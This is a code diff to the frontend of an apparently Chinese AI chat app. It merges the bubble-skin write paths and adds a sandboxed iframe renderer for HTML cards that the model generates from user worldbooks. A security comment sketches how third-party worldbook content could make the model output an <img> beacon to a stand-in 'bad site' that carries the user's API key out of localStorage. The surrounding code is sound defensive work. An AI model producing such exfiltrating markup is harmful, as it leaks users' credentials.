@@ -295,13 +295,19 @@ function bubblePresetSkin(key) {
   const p = BUBBLE_PRESETS.find(x => x.key === key);
   return Object.assign({}, BUBBLE_SKIN_DEFAULTS, (p && p.patch) || {});
 }
-function applyBubblePreset(key) {
-  const next = bubblePresetSkin(key);
-  Object.assign(BUBBLE_SKIN, next);
-  try { localStorage.setItem("x_bubbleSkin", JSON.stringify(next)); } catch (e) {}
+// 气泡皮肤只有这一处读、这一处写（one-public-mechanism）。
+// ⚠️以前「换一套预设」和「设置页保存」各写了一份 Object.assign + setItem + 重刷 CSS；
+//   2026-09-20 主题包也要带上气泡，那就是第三份了——先合成一处再接。
+function bubbleSkinSnapshot() { return Object.assign({}, BUBBLE_SKIN); }
+function writeBubbleSkin(next) {
+  // 盖在出厂值上，不是盖在当前值上：否则上一套残留的描边/贴纸会跟着新皮肤留下来
+  const merged = Object.assign({}, BUBBLE_SKIN_DEFAULTS, next || {});
+  Object.assign(BUBBLE_SKIN, merged);
+  try { localStorage.setItem("x_bubbleSkin", JSON.stringify(merged)); } catch (e) {}
   applyBubbleSkinCSS();
-  return next;
+  return merged;
 }
+function applyBubblePreset(key) { return writeBubbleSkin(bubblePresetSkin(key)); }
 // 那一整排细调字段 + 试衣镜：三处共用（设置→聊天气泡、单聊 ••• 里「只给 TA 换气泡」）。
 // ⚠️跟 BubbleSkinPresets 同一条道理——一处画、多处用。各写一份的话，
 //   加一个新字段就只会加在其中一处，另一处永远少一栏（「一层写在两处，第二处没跟上」）。
@@ -10335,8 +10341,78 @@ function OnlineTranslationControl() {
         "清掉重来")),
     cleared ? h("div", { style: { fontFamily: F_BODY, fontSize: 11, color: t.fog, marginTop: 5 } }, cleared) : null);
 }
-function TransText({ text, isU, zhReady, ink }) {
+// ── 世界书卡片：模型吐出来的一整块 HTML，画成卡（她 2026-09-20 立）──────────
+// 她给的场景：有人把「触发词 + HTML 模板」写进世界书，角色按自己的人设把空填上，
+// 前端要把那一整块画出来，而不是把尖括号原样念一遍。
+//
+// ⚠️这一层【一个字都不进聊天提示词】（lisa-phone-chat-prompt-budget 那条铁律）。
+//   要不要出卡片、卡片长什么样，全写在【用户自己挂的那份世界书】里——
+//   世界书本来就是按关键词按需注入的。所以这边只做一件事：认出来，然后安全地画。
+//
+// ⚠️⚠️安全是这件事的全部：那段 HTML 带 onclick、带 <style>，而它是【别人写的世界书
+//   让模型生成的】。一旦让它在本页跑，它就能读 localStorage——那里面是她的 API key
+//   和云同步密码，一个 <img src="坏站/?k=..."> 就送出去了，画面上什么都看不出来。
+//   所以永远走 iframe，而且：
+//     · sandbox 只给 allow-scripts，【不给 allow-same-origin】——两个一起给等于没沙盒。
+//       不给 same-origin 时 iframe 是个独立空源：localStorage 抛异常、cookie 拿不到、
+//       父页面的 DOM 碰不到。按钮照样能按。
+//     · 再叠一条 CSP 把出网整个掐掉（default-src 'none'），连信标都发不出去。
+//   这两道缺一不可：沙盒挡「读」，CSP 挡「送」。
+// ⚠️认卡片那一层搬去了 engine.js（施工规则/one-public-mechanism.md）：
+//   拆气泡的流水线在 engine.js/app.js 里，比这儿低一层，得先认出「这是一整块卡片」
+//   才知道不许拆。两边各留一份＝改一处永远漏一处，所以这儿不留第二份。
+// 卡片自己报身高：不给 same-origin 就读不到 contentDocument，只能让里头喊一声。
+// 每张卡发一个一次性 token，父层只认自己那一张（一屏可能同时开着好几张）。
+const HTML_CARD_BOOT = tok => '<script>(function(){function r(){try{var w=document.getElementById("wk-wrap");'
+  + 'if(!w)return;var x=Math.ceil(w.getBoundingClientRect().height);'
+  + 'parent.postMessage({wkCard:"' + tok + '",h:x},"*")}catch(e){}}'
+  + 'addEventListener("load",r);addEventListener("resize",r);'
+  + 'if(window.ResizeObserver&&document.body)new ResizeObserver(r).observe(document.body);'
+  + '[60,300,1000].forEach(function(d){setTimeout(r,d)});r()})()<\/script>';
+const HTML_CARD_CSP = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
+  + 'img-src data: blob:; style-src \'unsafe-inline\'; script-src \'unsafe-inline\'; font-src data:">';
+function htmlCardDoc(html, tok) {
+  return '<!DOCTYPE html><html><head><meta charset="utf-8">'
+    + '<meta name="viewport" content="width=device-width,initial-scale=1">'
+    + HTML_CARD_CSP
+    + '<style>html,body{margin:0;padding:0;background:transparent}'
+    + 'body{overflow-x:hidden}img{max-width:100%}'
+    + '#wk-wrap{display:flow-root}</style></head><body>'
+    + '<div id="wk-wrap">' + html + '</div>' + HTML_CARD_BOOT(tok) + '</body></html>';
+}
+function HtmlCard({ html }) {
+  const t = useTheme();
+  const tok = React.useMemo(() => "c" + Math.random().toString(36).slice(2, 10), [html]);
+  const [hgt, setHgt] = useState(160);
+  useEffect(() => {
+    const on = e => {
+      const d = e && e.data;
+      if (!d || d.wkCard !== tok) return;
+      const n = Number(d.h);
+      // ⚠️这儿不许再加余量。量的是内容层，但 ResizeObserver 会把我们设的高度
+      //   再吹回来一次；加一点就涨一点，正是 258→260→262 那条爬升回路。
+      if (n > 0 && n < 6000) setHgt(n);
+    };
+    window.addEventListener("message", on);
+    return () => window.removeEventListener("message", on);
+  }, [tok]);
+  return h("iframe", {
+    "data-wk": "htmlcard",
+    srcDoc: htmlCardDoc(html, tok),
+    sandbox: "allow-scripts",     // ⚠️不许加 allow-same-origin，见上面那段
+    referrerPolicy: "no-referrer",
+    scrolling: "no",
+    style: { display: "block", width: "100%", height: hgt + "px", border: "none",
+      background: "transparent", borderRadius: 10, colorScheme: "light" }
+  });
+}
+function TransText({ text, isU, zhReady, ink, inline }) {
   const [autoShow] = useOnlineTranslationAuto();
+  // 世界书卡片走这儿分流：TransText 是全库【唯一】那条正文渲染路（单聊/群聊/通话/
+  // 线下引用/查手机都用它），所以闸开在这一处，八处一起合规。
+  // inline 的那几处是「某某：一句话」这种夹在行里的引用，塞张卡进去会把那一行撑烂。
+  const _card = inline ? null : (typeof htmlCardOf === "function" ? htmlCardOf(text) : null);
+  if (_card) return h(HtmlCard, { html: _card });
   // 翻译状态属于原文和自带译文这一对内容。编辑、窗口复用、译文晚到时
   // 重建内部状态；旧异步请求只会结束在旧实例，不能把结果写进新气泡。
   return h(TransTextState, { key: JSON.stringify([text, !!isU, zhReady || ""]), text, isU, zhReady, ink, autoShow });
@@ -10719,7 +10795,7 @@ function CallEndPill({ m, chars, onBg }) {
         ? h("div", { key: j, style: { fontFamily: F_DISPLAY, fontStyle: "italic", fontSize: 11.5, color: t.fog, textAlign: "center", margin: "5px 0" } }, (l.senderName ? l.senderName + " " : "") + "（" + l.content + "）")
         : h("div", { key: j, style: { fontFamily: F_BODY, fontSize: 12.5, lineHeight: 1.6, color: t.ink, margin: "3px 0" } },
             l.ts ? h("span", { style: { fontFamily: "'Archivo','SF Mono',ui-monospace,monospace", fontSize: 9.5, color: t.fog, marginRight: 6 } }, String(new Date(l.ts).getHours()).padStart(2, "0") + ":" + String(new Date(l.ts).getMinutes()).padStart(2, "0")) : null,
-            h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink }),
+            h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink, inline: true }),
             l.role !== "user" ? h(TtsDot, { k: "pill" + j, text: l.content, spk: spkOf(l), tp }) : null)),
       m.sum ? h("div", { style: { marginTop: 8, paddingTop: 8, borderTop: "1px dashed " + t.line, fontFamily: F_BODY, fontSize: 11.5, color: t.sub, lineHeight: 1.6 } }, "小结：" + m.sum) : null) : null);
 }
@@ -10781,7 +10857,7 @@ function CallLogSheet({ calls, chars, onClose }) {
                 ? h("div", { key: j, style: { fontFamily: F_DISPLAY, fontStyle: "italic", fontSize: 11.5, color: t.fog, textAlign: "center", margin: "5px 0" } }, (l.senderName ? l.senderName + " " : "") + "（" + l.content + "）")
                 : h("div", { key: j, style: { fontFamily: F_BODY, fontSize: 12.5, lineHeight: 1.6, color: t.ink, margin: "3px 0" } },
                     l.ts ? h("span", { style: { fontFamily: "'Archivo','SF Mono',ui-monospace,monospace", fontSize: 9.5, color: t.fog, marginRight: 6 } }, fmtHM(l.ts)) : null,
-                    h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink }),
+                    h("span", { style: { color: l.role === "user" ? t.tint : t.sub, fontWeight: 600 } }, (l.role === "user" ? "我" : (l.senderName || "TA")) + "："), h(TransText, { text: l.content, isU: l.role === "user", zhReady: l.zh, ink: t.ink, inline: true }),
                     l.role !== "user" ? h(TtsDot, { k: key + "_" + j, text: l.content, spk: spkOf(l), tp }) : null)),
               m.sum ? h("div", { style: { marginTop: 8, paddingTop: 8, borderTop: "1px dashed " + t.line, fontFamily: F_BODY, fontSize: 11.5, color: t.sub, lineHeight: 1.6 } }, "小结：" + m.sum) : null) : null);
         })));
